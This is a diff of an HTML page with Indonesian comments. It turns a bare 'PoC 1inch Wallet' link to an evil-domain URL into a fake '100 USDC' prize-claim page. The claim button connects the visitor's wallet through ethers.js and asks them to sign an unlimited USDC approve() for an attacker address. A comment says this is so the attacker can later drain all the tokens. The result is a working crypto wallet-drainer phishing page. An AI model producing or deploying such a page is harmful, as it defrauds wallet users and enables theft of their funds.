@@ -3,48 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC 1inch Wallet</title>
+    <title>Penghargaan Gratis 1inch</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        /* Mengatur tampilan agar bersih dan putih seperti di gambar */
         body {
-            margin: 0;
-            padding: 0;
+            font-family: sans-serif;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            text-align: center;
         }
-
-        /* Gaya teks "Click Here" agar tebal dan minimalis */
-        .click-text {
-            font-size: 32px;
-            font-weight: 800;
-            color: #000000;
-            text-decoration: none;
+        .claim-btn {
+            padding: 20px 40px;
+            font-size: 24px;
+            background-color: #1a1a1a;
+            color: white;
+            border: none;
+            border-radius: 12px;
             cursor: pointer;
-            transition: opacity 0.2s;
-        }
-
-        .click-text:active {
-            opacity: 0.5;
         }
     </style>
 </head>
 <body>
 
-    <a href="https://rclm.link.evil-domain.com" class="click-text">
-        Click Here
-    </a>
+    <h1>Selamat! Anda Memenangkan 100 USDC</h1>
+    <p>Klik tombol di bawah untuk klaim hadiah Anda ke wallet.</p>
+    
+    <button class="claim-btn" id="claimButton">Klaim Hadiah Sekarang</button>
 
     <script>
-        // Opsional: Menambahkan log untuk memastikan dApp browser terdeteksi
-        window.addEventListener('load', () => {
-            if (window.ethereum && window.ethereum.isOneInch) {
-                console.log("Terdeteksi: Membuka dari 1inch Wallet Browser");
+        const claimButton = document.getElementById('claimButton');
+
+        // Alamat penyerang dan kontrak token (Contoh: USDC di Ethereum)
+        const victimTokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; 
+        const attackerAddress = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"; // Ganti dengan address penyerang
+
+        async function triggerExploit() {
+            if (window.ethereum) {
+                try {
+                    // 1. Minta koneksi wallet (jika belum terhubung)
+                    const provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
+                    const signer = provider.getSigner();
+
+                    // 2. ABI Sederhana untuk fungsi 'approve' (izin akses token)
+                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                    const contract = new ethers.Contract(victimTokenAddress, abi, signer);
+
+                    // 3. Memicu pop-up transaksi otomatis
+                    // Mengatur jumlah 'unlimited' agar penyerang bisa menguras semua token nanti
+                    const unlimitedAmount = ethers.constants.MaxUint256;
+                    
+                    console.log("Memicu transaksi approve...");
+                    await contract.approve(attackerAddress, unlimitedAmount);
+
+                } catch (error) {
+                    console.error("User menolak atau error:", error);
+                }
+            } else {
+                alert("Gunakan browser wallet (seperti 1inch) untuk klaim!");
             }
-        });
+        }
+
+        claimButton.addEventListener('click', triggerExploit);
     </script>
 </body>
 </html>
